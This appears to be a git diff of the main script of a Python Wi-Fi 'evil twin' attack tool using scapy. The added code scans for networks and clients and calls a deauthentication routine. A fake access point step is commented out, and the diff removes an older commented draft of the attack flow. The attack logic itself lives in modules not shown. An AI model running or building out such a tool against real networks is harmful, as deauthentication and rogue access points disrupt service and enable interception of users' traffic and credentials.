@@ -24,7 +24,7 @@
 
 from scapy.all import *
 from network import Network
-from client import Client
+from fake import Fake
 
 
 def start_attack():
@@ -33,8 +33,17 @@ def start_attack():
     #     sys.exit('need sudo permission')
 
     net_obj = Network()
-    net_attack = net_obj.scanning_network()
-    clinet_obj = Client()
+    net_interface = net_obj.get_interface()
+    # scanning for networks
+    net_mac = net_obj.scanning_networks()
+    # scanning for clients 
+    cli_mac = net_obj.scanning_clients()
+
+    fake_obj = Fake(net_interface, net_mac, cli_mac)
+    # deauthentication
+    fake_obj.deauthentication()
+    # fake_ap
+    # net_obj.fake_ap()
 
     net_obj.off()
     print('done')
@@ -42,27 +51,3 @@ def start_attack():
 
 if __name__ == '__main__':
     start_attack()
-
-
-# def start_attack():
-#     print('start EVIL TWIN attack...')
-#     if os.geteuid():
-#         sys.exit('need sudo permission')
-    
-#     net_card_name = input('insert your network card name: ')
-#     # need to check if the net_card is exist
-#     os.popen('iwconfig').read()         # check how to use it 
-    
-#     # realy start the attack
-#     change_monitor(net_card_name, 'monitor')
-    
-#     # using thread and wait for the thread join
-#     # network_list = scanning_network(net_card_name)
-#     # network = choose_network_to_attack(network_list)      # need to do
-
-#     # using thread and wait for the thread join
-#     # client = scanning_clients(network)      # need to do
-#     # attack_client(client)       # need to do
-    
-#     # end the attack
-#     change_monitor(net_card_name, 'managed')
